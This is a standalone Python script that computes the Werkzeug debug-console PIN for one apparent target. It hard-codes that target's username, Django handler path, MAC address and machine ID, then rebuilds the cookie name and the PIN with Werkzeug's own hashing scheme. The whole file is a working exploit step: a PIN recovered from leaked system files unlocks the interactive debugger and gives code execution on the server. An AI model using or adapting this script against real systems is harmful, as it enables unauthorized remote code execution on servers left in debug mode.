import hashlib
from itertools import chain
probably_public_bits = [
    'werkzeug',# username
    'django.contrib.staticfiles.handlers',# modname
    'StaticFilesHandler',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.11/site-packages/django/contrib/staticfiles/handlers.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378285571',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'a7cbe35e-bae7-4544-b5f3-0068171268f4967e0e0070c8f5a54905b0da508bf2979f1cd7ae33ac2c427f1b726fb29be6d9'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)